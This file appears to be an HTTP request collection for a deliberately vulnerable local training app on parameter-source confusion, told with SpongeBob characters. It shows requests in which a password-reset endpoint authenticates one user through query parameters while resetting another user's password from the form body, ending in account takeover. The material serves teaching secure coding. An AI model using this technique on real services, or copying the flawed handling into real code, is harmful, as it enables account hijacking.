@base = http://localhost:8000/confusion/source-precedence

### Squidward checks his own messages with the FIXED endpoint
POST {{base}}/example8/messages
Content-Type: application/x-www-form-urlencoded

user=squidward&password=clarinet123

# Results in 200 OK:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }

###

### Squidward tries his old Example 7 exploit - but they fixed it!
POST {{base}}/example8/messages?user=spongebob
Content-Type: application/x-www-form-urlencoded

user=squidward&password=clarinet123

# Results in 401 Unauthorized:
#
# Invalid user or password
#
# The old trick doesn't work anymore. They're using request.values consistently now.

###

### Plankton discovers the NEW password reset endpoint
POST {{base}}/example8/password_reset?user=plankton&password=chumbucket
Content-Type: application/x-www-form-urlencoded

user=squidward&new_password=hacked123

# Results in successful password change:
#
# {
#   "status": "success",
#   "user": "squidward",
#   "message": "Password updated"
# }
#
# The developers made the SAME mistake in their new feature!

###

### Plankton logs into Squidward's account with the new password
POST {{base}}/example8/messages
Content-Type: application/x-www-form-urlencoded

user=squidward&password=hacked123

# Results in full account takeover:
#
# {
#   "owner": "squidward",
#   "messages": [
#     {
#       "from": "mr.krabs",
#       "message": "Squidward, I'm switching yer shifts to Tuesday through Saturday. No complaints!"
#     },
#     {
#       "from": "squidward",
#       "message": "Note to self: Mr. Krabs hides the safe key under the register. Combination is his first dime's serial number."
#     }
#   ]
# }
#
# Account takeover! Not just reading data anymore - Plankton now OWNS Squidward's account.
# Same root cause as Examples 2-7, but the "fix" gave developers false confidence.
